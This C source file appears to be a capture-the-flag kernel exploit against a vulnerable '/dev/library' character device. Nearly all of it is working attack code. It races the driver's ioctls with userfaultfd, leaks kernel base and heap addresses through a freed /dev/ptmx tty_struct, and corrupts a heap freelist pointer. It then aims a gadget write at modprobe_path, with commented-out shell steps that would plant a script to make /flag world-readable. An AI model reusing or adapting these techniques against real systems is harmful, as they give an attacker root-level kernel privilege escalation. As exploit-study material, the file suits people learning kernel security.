/*
 * author: @meowmeowxw
 */
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/resource.h>
#include <pthread.h>
#include <sys/mman.h>
#include <poll.h>
#include <time.h>
#include <unistd.h>

#define DEVICE_NAME "/dev/library"

#define BOOK_DESCRIPTION_SIZE 0x300

#define CMD_ADD			0x3000
#define CMD_REMOVE		0x3001
#define CMD_REMOVE_ALL	0x3002
#define CMD_ADD_DESC	0x3003
#define CMD_GET_DESC 	0x3004

#define PAGESIZE 0x1000
#define BUFFER_SIZE 32
#define LEAK_OFFSET 0xd92f0
#define MODPROBE_PATH_OFFSET 0xa3f7e0

int ioctl_add(uint64_t id);
int ioctl_remove(uint64_t id);
int ioctl_add_desc(uint64_t id, uint8_t *buffer);
int ioctl_get_desc(uint64_t id, uint8_t *buffer);
int ioctl_remove_all();
void leak_heap();
void write_next_ptr();
void *race_userfault(void (*func)());
int userfaultfd(int flags);
int register_ufd(uint64_t page);
void print_leak(uint64_t *ptr, int size);
void get_rax();

typedef struct {
    uint64_t index;
    uint8_t *ptr;
} request_t;

typedef struct {
    uint64_t index;
    void *next;
    void *prev;
} book_details;

uint64_t func_leak = 0x0L,
         kbase = 0x0L,
         kheap = 0x0L,
         next_ptr = 0x0L,
         modprobe_path = 0x837d00,
         heap_leak = 0x0L,
         mov_addr_rdx_rsi = 0x13e9b1,
         mov_rax_addr_rdx = 0x17538d,
         mov_rax_addr_rsi = 0x34e74;
int fd, ufd, ret, ptmx;
uint64_t uf_page, rax = 0, leak[BOOK_DESCRIPTION_SIZE];
uint8_t cyclic[] = {
        97, 97, 97, 97, 97, 97, 97, 97, 98, 97, 97, 97, 97, 97, 97, 97, 99, 97, 97, 97, 97, 97, 97, 97, 100, 97, 97, 97, 97, 97, 97, 97, 101, 97, 97, 97, 97, 97, 97, 97, 102, 97, 97, 97, 97, 97, 97, 97, 103, 97, 97, 97, 97, 97, 97, 97, 104, 97, 97, 97, 97, 97, 97, 97, 105, 97, 97, 97, 97, 97, 97, 97, 106, 97, 97, 97, 97, 97, 97, 97, 107, 97, 97, 97, 97, 97, 97, 97, 108, 97, 97, 97, 97, 97, 97, 97, 109, 97, 97, 97, 97, 97, 97, 97, 110, 97, 97, 97, 97, 97, 97, 97, 111, 97, 97, 97, 97, 97, 97, 97, 112, 97, 97, 97, 97, 97, 97, 97, 113, 97, 97, 97, 97, 97, 97, 97, 114, 97, 97, 97, 97, 97, 97, 97, 115, 97, 97, 97, 97, 97, 97, 97, 116, 97, 97, 97, 97, 97, 97, 97, 117, 97, 97, 97, 97, 97, 97, 97, 118, 97, 97, 97, 97, 97, 97, 97, 119, 97, 97, 97, 97, 97, 97, 97, 120, 97, 97, 97, 97, 97, 97, 97, 121, 97, 97, 97, 97, 97, 97, 97};

int main(int argc, char **argv) {
    uint8_t *buf = calloc(BOOK_DESCRIPTION_SIZE, 1);
    pthread_t th;

    fd = open(DEVICE_NAME, O_RDONLY);
    printf("fd: %d\n", fd);

    ioctl_add(0);

    // 1st stage: LEAK KBASE AND KHEAP
    ufd = register_ufd(0xaaa000);
    printf("registered ufd: %d\t 0x%lx\n", ufd, uf_page);
    pthread_create(&th, NULL, (void *)race_userfault, leak_heap);
    ioctl_get_desc(0, (uint8_t *)0xaaa000);

    kbase = leak[66] - 0x14fc00;
    kheap = leak[8] - 0x38;
    modprobe_path += kbase;
    mov_addr_rdx_rsi += kbase;
    mov_rax_addr_rdx += kbase;
    mov_rax_addr_rsi += kbase;

    close(ptmx);


    // 2nd stage: LEAK NEXT PTR
    ioctl_add(0);

    ufd = register_ufd(0xbbb000);
    printf("registered ufd: %d\t 0x%lx\n", ufd, uf_page);
    pthread_create(&th, NULL, (void *)race_userfault, ioctl_remove_all);
    ioctl_get_desc(0, (uint8_t *)0xbbb000);
    next_ptr = leak[512 / 8];

    printf("\n");
    printf("[*] kbase:             0x%016lx\n", kbase);
    printf("[*] kheap:             0x%016lx\n", kheap);
    printf("[*] next_ptr:          0x%016lx\n", next_ptr);
    printf("[*] mov_addr_rdx_rsi:  0x%016lx\n", mov_addr_rdx_rsi);
    printf("[*] mov_rax_addr_rsi:  0x%016lx\n", mov_rax_addr_rsi);
    printf("[*] mov_rax_addr_rdx:  0x%016lx\n", mov_rax_addr_rdx);
    printf("[*] modprobe_path:     0x%016lx\n", modprobe_path);
    ioctl_remove(0);

    // 3rd stage overwrite next ptr
    ioctl_add(0);
    ufd = register_ufd(0xccc000);
    printf("registered ufd: %d\t 0x%lx\n", ufd, uf_page);
    pthread_create(&th, NULL, (void *)race_userfault, ioctl_remove_all);
    ((uint64_t *)(uf_page + 0xf00))[512/8] = kheap + 32;
    ioctl_add_desc(0, (uint8_t *)0xcccf00);

    ioctl_add(0);
    memset(buf, 0, BOOK_DESCRIPTION_SIZE);
    ((uint64_t *)(buf + 32))[512/8] = next_ptr;
    ioctl_add_desc(0, buf);

    ioctl_add(1);
    ioctl_add(2);

    for (int i = 0; i < 300; i++) {
        buf[i] = cyclic[i];
    }
    ((uint64_t *)buf)[32 / 8] = 0xffffffff810001dc;
    ((uint64_t *)buf)[40 / 8] = 0xffffffff810001dc;
    ((uint64_t *)buf)[48 / 8] = 0xffffffff810001dc;
    ((uint64_t *)buf)[96 / 8] = mov_rax_addr_rdx;
    ioctl_add_desc(2, buf);
    memset(buf, 0x0, 0x300);
    ioctl_get_desc(2, buf);

    /* book_details b = { */
    /*     .index = 0, */
    /*     .next = (void *)(kheap + 32), */
    /*     .prev = NULL, */
    /* }; */
    /* memcpy(buf + 0x300 - 0x20, &b, 0x18); */
    /* print_leak((uint64_t *)buf, 0x300); */
    /* ioctl_add_desc(1, buf); */

    ioctl_remove(1);

    ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    memset(buf, 0, 0x300);
    ioctl_get_desc(0, buf);

    memset(buf, 0, 0x300);
    memcpy(buf, leak, 0x300);
    ((uint64_t *)buf)[7] = next_ptr;
    /* ((uint64_t *)buf)[6] = 0x42424242424242; */
    print_leak((uint64_t *)buf, 0x300);
    ioctl_add_desc(0, buf);

    memset(buf, 0, 0x300);
    ioctl_get_desc(0, buf);

    ioctl_get_desc(2, buf);
    int x = ioctl(ptmx, 0x1, modprobe_path);
    get_rax();

    printf("%x\n", x);
    fflush(stdout);

    /* system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/bho"); */
    /* system("chmod +x /home/ctf/bho"); */
    /* system("echo -ne '#!/bin/sh\nchmod 777 /flag' > /home/ctf/a\n"); */
    /* system("chmod +x /home/ctf/a"); */
    /* system("/home/ctf/bho"); */

    return 0;
}

int ioctl_add(uint64_t id) {
    request_t arg = {
        .index = id,
        .ptr = NULL
    };
    printf("[*] ioctl_add[%ld]\n", id);
    ret = ioctl(fd, CMD_ADD, &arg);
    if (ret != 0) {
        printf("[!] ioctl_add   ret: %d\t id: %ld\n", ret, id);
    }
    return 0;
}

int ioctl_remove(uint64_t id) {
    request_t arg = {
        .index = id,
        .ptr = NULL
    };
    printf("[*] ioctl_remove[%ld]\n", id);
    ret = ioctl(fd, CMD_REMOVE, &id);
    if (ret != 0) {
        printf("[!] ioctl_remove   ret: %d\t id: %ld\n", ret, id);
    }
    return 0;
}

int ioctl_add_desc(uint64_t id, uint8_t *buffer) {
    request_t arg = {
        .index = id,
        .ptr = buffer
    };
    printf("[*] ioctl_add_desc[%ld]\n", id);
    ret = ioctl(fd, CMD_ADD_DESC, &arg);
    if (ret != 0) {
        printf("[!] ioctl_add_desc   ret: %d\t id: %ld\n", ret, id);
    }
    return 0;
}

int ioctl_get_desc(uint64_t id, uint8_t *buffer) {
    // memset(buffer, 0, BOOK_DESCRIPTION_SIZE);
    request_t arg = {
        .index = id,
        .ptr = buffer
    };
    printf("[*] ioctl_get_desc[%ld]\n", id);
    ret = ioctl(fd, CMD_GET_DESC, &arg);
    if (ret != 0) {
        printf("[!] ioctl_get_desc   ret: %d\t id: %ld\n", ret, id);
    }
    memcpy(leak, buffer, BOOK_DESCRIPTION_SIZE);
    print_leak((uint64_t *)buffer, BOOK_DESCRIPTION_SIZE);
    return 0;
}

int ioctl_remove_all() {
    request_t arg = {
        .index = 0xffffff,
        .ptr = NULL
    };
    printf("[*] ioctl_remove_all\n");
    ret = ioctl(fd, CMD_REMOVE_ALL, &arg);
    if (ret != 0) {
        printf("[!] ioctl_remove_all ret: %d\n", ret);
    }
    return 0;
}

void print_leak(uint64_t *ptr, int size) {
    for (int i = 0; i < size / 8; i++) {
        printf("0x%016lx\t", ptr[i]);
        if (!((i + 1) % 2)) {
            printf("\n");
        }
    }
    printf("\n");
}

int register_ufd(uint64_t page) {
    int fd = 0;
    int memsize = 0x1000;
    uf_page = page;
    struct uffdio_api api = { .api = UFFD_API };

    uf_page = (uint64_t)mmap((void *)uf_page, 0x2000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    if ((void *)uf_page == MAP_FAILED) {
        perror("mmap uf_page");
        exit(2);
    }

    if ((fd = userfaultfd(O_NONBLOCK)) == -1) {
        fprintf(stderr, "++ userfaultfd failed: %m\n");
        exit(-1);
    }

    if (ioctl(fd, UFFDIO_API, &api)) {
        fprintf(stderr, "++ ioctl(fd, UFFDIO_API, ...) failed: %m\n");
        exit(-1);
    }
    if (api.api != UFFD_API) {
        fprintf(stderr, "++ unexepcted UFFD api version.\n");
        exit(-1);
    }

    /* mmap some pages, set them up with the userfaultfd. */
    struct uffdio_register reg = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = uf_page,
            .len = memsize
        }
    };

    if (ioctl(fd, UFFDIO_REGISTER,  &reg) == -1) {
        fprintf(stderr, "++ ioctl(fd, UFFDIO_REGISTER, ...) failed: %m\n");
        exit(-1);
    }

    return fd;
}

void *race_userfault(void (*func)()) {
    char uf_buffer[0x1000];
    struct pollfd evt = { .fd = ufd, .events = POLLIN };

    printf("[!!] POLLING\n");
    while (poll(&evt, 1, -1) > 0) {
        /* unexpected poll events */
        if (evt.revents & POLLERR) {
            perror("poll");
            exit(-1);
        } else if (evt.revents & POLLHUP) {
            perror("pollhup");
            exit(-1);
        }
        struct uffd_msg fault_msg = {0};
        if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
            perror("read");
            exit(-1);
        }
        char *place = (char *)fault_msg.arg.pagefault.address;
        if (fault_msg.event != UFFD_EVENT_PAGEFAULT
                || (place != (void *)uf_page && place != (void *)uf_page + PAGESIZE)) {
            fprintf(stderr, "unexpected pagefault?.\n");
            exit(-1);
        }
        if (place == (void *)uf_page) {
            printf("[+] got page fault at address %p, nice!\n", place);
            printf("[!] call whatever I want\n");
            func();
            printf("[*] done! now releasing ufd to finish exit\n");

            /* release by copying some data to faulting address */
            struct uffdio_copy copy = {
                .dst = (long) place,
                .src = (long) uf_buffer,
                .len = PAGESIZE
            };
            if (ioctl(ufd, UFFDIO_COPY, &copy) < 0) {
                perror("ioctl(UFFDIO_COPY)");
                exit(-1);
            }
            break;
        }
    }
    close(ufd);
    return NULL;
}

int userfaultfd(int flags) {
    return syscall(SYS_userfaultfd, flags);
}

void leak_heap() {
    ioctl_remove_all();
    ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
}

void get_rax() {
    asm volatile (
            "mov %%rax, %0\n\t"
            : "=r"(rax)
            :
            : "rax"
            );
}
